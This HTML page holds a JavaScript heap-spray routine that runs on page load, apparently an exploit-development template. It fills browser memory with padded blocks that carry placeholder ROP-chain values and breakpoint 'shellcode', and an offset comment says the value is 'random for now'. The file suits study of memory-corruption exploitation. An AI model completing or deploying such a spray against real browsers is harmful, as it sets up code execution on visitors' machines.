<html>
<head>
<script>

var sprayblocks = new Array();

function allocateblocks()
{
	// define payload
	var beginning = unescape("TEST")
	var ropchain = unescape("%u6161%u6161%u6262%u6262%u6363%u6363%u6464%u6464%u6565%u6565");
	var shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
	var junk = unescape("%u2020%u2020");
	
	// create large chunk (it's stored in heap, but doesn't matter here). Length doesn't matter.
	while (beginning.length < 0x4000) beginning += junk;
	
	// add the padding from block start to our payload (it has to be computed depending on where you jump) 
	offset = 0x5F4;  // random for now
	var junk_front = beginning.substring(0, offset);
	
	// construct one block of 0x800 bytes (0x1000/2) <-- real length = 0x1000
	var junk_end = beginning.substring(8, 0x2000 + 8 - junk_front.length - ropchain.length - shellcode.length)
	var smallblock = junk_front + ropchain + shellcode + junk_end;

	// repeat a few times 
	var largeblock = "";
	while (largeblock.length < 0x8000) { largeblock = largeblock + smallblock; }

	// allocate 0x5000 times
	for (i = 0; i < 0x5000; i++) { sprayblocks[i] = smallblock.substring(0, ((0x7000-6)/2)-8);	}
	
}
</script>
</head>

<body onload="allocateblocks()">
</body>
</html>
